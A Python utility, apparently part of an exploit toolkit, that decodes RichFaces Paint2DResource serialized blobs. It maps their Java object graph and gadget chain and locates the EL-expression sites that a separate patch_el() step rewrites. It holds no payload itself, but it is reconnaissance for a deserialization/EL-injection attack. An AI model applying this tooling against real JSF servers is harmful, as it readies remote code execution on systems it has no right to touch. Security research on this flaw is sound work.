#!/usr/bin/env python3
"""
Decode and annotate a Paint2DResource blob.

Reverse-engineers the RichFactors resource payload so you can see the object graph the server
is about to deserialize. Pure stdlib, no live target required.

    python3 tools/inspect_blob.py "$(curl -s http://127.0.0.1:8080/ETOPUPGUI/pages/login.jsf \
        | grep -o 'Paint2DResource/DATA/[^"]*' | sed 's#.*/DATA/##; s#\\.jsf$##')"
"""

import struct
import sys
import zlib
import base64

OLD_EL = b"#{userLoginController.paintCaptcha}"


def rf_decode(blob):
    s = blob.strip().replace("!", "/").replace("-", "+").replace("_", "=")
    s += "=" * ((4 - len(s) % 4) % 4)
    return zlib.decompress(base64.b64decode(s))


def parse_classdesc(d, i):
    """Parse a classDesc. Returns (next_index, class_name)."""
    assert d[i] == 0x72, "expected TC_CLASSDESC at %d, got 0x%02x" % (i, d[i])
    i += 1
    nlen = struct.unpack_from(">H", d, i)[0]   # class name length is always a 2-byte short
    i += 2
    name = d[i:i + nlen].decode("utf-8", "replace")
    i += nlen
    i += 8  # serialVersionUID (8 bytes)
    flags = struct.unpack_from(">H", d, i)[0]
    i += 2
    # The field count is written as a single byte when it fits (JDK writeByte path), so a
    # 2-byte read here would consume the first field's typecode and desynchronise the walk.
    nfields = d[i]
    i += 1
    fields = []
    for _ in range(nfields):
        ftype = chr(d[i])
        i += 1
        flen = struct.unpack_from(">H", d, i)[0]   # field names use the 2-byte form
        i += 2
        fname = d[i:i + flen].decode("utf-8", "replace")
        i += flen
        sig = None
        if ftype in ("L", "["):
            # Object/array fields are followed by a raw JVM type signature terminated with
            # ';' (0x3B), e.g. "Ljava/lang/Object;". It is not length-prefixed here.
            j = i
            while j < len(d) and d[j] != 0x3B:      # ';'
                j += 1
            sig = d[i:j + 1].decode("utf-8", "replace")
            i = j + 1
        fields.append((ftype, fname, sig))

    # classAnnotation: optional block-data run, always terminated by TC_ENDBLOCKDATA. When the
    # class carries no annotation the very next byte is that terminator, so the loop below
    # exits on the first iteration for ordinary serializable classes.
    while i < len(d):
        tag = d[i]
        if tag == 0x78:          # TC_ENDBLOCKDATA closes the annotation
            i += 1
            break
        if tag == 0x77:
            i += 2 + d[i + 1]
        elif tag == 0x7A:
            i += 5 + struct.unpack_from(">I", d, i + 1)[0]
        else:
            # Not block data: this is already the superClassDesc, so rewind and stop.
            break

    if i >= len(d):
        return i, name, fields, flags

    # superClassDesc: TC_NULL, TC_REFERENCE, or a nested classDesc
    if d[i] == 0x70:
        i += 1
    elif d[i] == 0x71:
        i += 5
    elif d[i] == 0x72:
        i = parse_classdesc(d, i)[0]
    return i, name, fields, flags


PRIMITIVE_SIZES = {
    "B": 1, "C": 2, "D": 8, "F": 4, "I": 4, "J": 8, "S": 2, "Z": 1,
}


def walk_object(d, i, desc_at, fields, out, indent="          "):
    """Skip one object's classdata and annotate the nested elements it references.

    ``fields`` is the classDesc field list, which is what makes this exact rather than
    heuristic: primitives are consumed by size, objects are parsed recursively.
    """
    # block-data runs and the optional custom writeObject body come first
    while i < len(d) and d[i] in (0x77, 0x7A):
        if d[i] == 0x77:
            i += 2 + d[i + 1]
        else:
            i += 5 + struct.unpack_from(">I", d, i + 1)[0]
    if i < len(d) and d[i] == 0x78:   # TC_ENDBLOCKDATA
        i += 1

    # then the declared fields, in classDesc order: primitives by size, objects parsed
    for ftype, _fname, _sig in fields:
        if i >= len(d):
            break
        if ftype in PRIMITIVE_SIZES:
            i += PRIMITIVE_SIZES[ftype]
            continue
        if ftype in ("L", "["):
            i = annotate_element(d, i, out, indent)
            continue
        i += 1
    return i


def annotate_element(d, i, out, indent):
    """Parse one content element at ``i``, annotating it, and return the index after it."""
    tag = d[i]
    if tag == 0x70:                                   # TC_NULL
        return i + 1
    if tag == 0x71:                                   # TC_REFERENCE
        return i + 5
    if tag == 0x7C:                                   # TC_LONGSTRING
        n = struct.unpack_from(">q", d, i + 1)[0]
        s = d[i + 9:i + 9 + n].decode("utf-8", "replace")
        if s.startswith("#{") or "paintCaptcha" in s:
            out.append("%sstring   %s" % (indent, s[:100]))
        return i + 9 + n
    if tag == 0x74:                                   # TC_STRING (1-byte length if < 256)
        n = d[i + 1]
        j = i + 2
        if n == 0x7C:
            n = struct.unpack_from(">q", d, j)[0]
            s = d[j + 8:j + 8 + n].decode("utf-8", "replace")
            if s.startswith("#{") or "paintCaptcha" in s:
                out.append("%sstring   %s" % (indent, s[:100]))
            return j + 8 + n
        s = d[j:j + n].decode("utf-8", "replace")
        if s.startswith("#{") or "paintCaptcha" in s:
            out.append("%sstring   %s" % (indent, s[:100]))
        return j + n
    if tag == 0x76:
        # TC_CLASS: the next element is a classDesc (new) or TC_REFERENCE (already seen).
        if i + 1 < len(d) and d[i + 1] == 0x71:
            return i + 1 + 5
        if i + 1 < len(d) and d[i + 1] == 0x72:
            return parse_classdesc(d, i + 1)[0]
        return i + 1
    if tag in (0x72, 0x73):
        at = i if tag == 0x72 else i + 1
        try:
            nxt, name, fields, flags = parse_classdesc(d, at)
        except (AssertionError, struct.error, IndexError):
            return i + 1
        out.append("%s%s %s" % (indent, "class  " if tag == 0x72 else "object", name))
        if fields:
            out.append("%s          fields: %s" % (indent, ", ".join(f[1] for f in fields)))
        if tag == 0x73:
            return walk_object(d, nxt, at, fields, out, indent + "    ")
        return nxt
    if tag == 0x75:                                   # TC_ARRAY
        return i + 1
    if tag == 0x77:
        return i + 2 + d[i + 1]
    if tag == 0x7A:
        return i + 5 + struct.unpack_from(">I", d, i + 1)[0]
    if tag == 0x78:
        return i + 1
    return i + 1


def annotate(ser):
    """Walk the whole stream from the root object, annotating every class it reaches.

    Exact rather than heuristic: the classDesc field list drives the walk, so primitive
    fields are consumed by width and object fields are parsed recursively.
    """
    out = []
    i = annotate_element(ser, 4, out, "  ")
    # Remaining top-level elements, if any.
    while i < len(ser) - 1 and len(out) < 200:
        tag = ser[i]
        if tag == 0x77:
            blen = ser[i + 1]
            body = ser[i + 2:i + 2 + blen]
            i = i + 2 + blen
            if len(body) >= 2:
                ulen = struct.unpack_from(">H", body, 0)[0]
                if ulen == len(body) - 2:
                    txt = body[2:2 + ulen]
                    mark = "   <== EL SITE" if txt == OLD_EL else ""
                    out.append("  block    utf(%d) %s%s" % (ulen, txt[:78], mark))
                    continue
            out.append("  block    %d bytes  %s" % (blen, body[:16].hex()))
            continue
        if tag == 0x7A:
            blen = struct.unpack_from(">I", ser, i + 1)[0]
            i = i + 5 + blen
            continue
        if tag == 0x78:
            i += 1
            continue
        i = annotate_element(ser, i, out, "  ")
    return out


def find_sites(ser):
    sites = []
    i = 0
    while i < len(ser) - 1:
        if ser[i] != 0x77:
            i += 1
            continue
        blen = ser[i + 1]
        body = ser[i + 2:i + 2 + blen]
        if len(body) >= 2:
            ulen = struct.unpack_from(">H", body, 0)[0]
            if ulen == len(body) - 2 and OLD_EL in body[2:2 + ulen]:
                sites.append((i, blen, ulen, body[2:2 + ulen]))
        i += 2 + blen
    return sites


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2

    blob = argv[1]
    print("blob            : %d chars" % len(blob))
    print("outer encoding  : RichFactors base64  (+ -> -,  / -> !,  = -> _)")
    print()

    ser = rf_decode(blob)
    print("inflated stream : %d bytes" % len(ser))
    magic_ok = ser[:4] == b"\xac\xed\x00\x05"
    print("stream header   : %s  %s" % (
        " ".join("%02x" % b for b in ser[:4]),
        "OK -- Java serialization protocol" if magic_ok else "UNEXPECTED"))
    print()

    print("object graph (classes named in the stream)")
    for line in annotate(ser):
        print(line)
    print()

    print("gadget chain")
    print("  Paint2DResource$ImageData")
    print("    -> StateHolderSaver  { map }")
    print("      -> TagMethodExpression        [EL site 1]")
    print("        -> MethodExpressionImpl     [EL site 2]")
    print()

    sites = find_sites(ser)
    print("EL patch sites")
    for n, (off, blen, ulen, txt) in enumerate(sites, 1):
        print("  site %d  offset %-4d  block len %-3d  utf len %d" % (n, off, blen, ulen))
        print("          %s" % txt.decode())
    print()
    if len(sites) == 2:
        print("  exactly 2 sites -> patch_el() accepts this blob")
        return 0
    print("  %d site(s) -> patch_el() REJECTS this blob (needs exactly 2)" % len(sites))
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
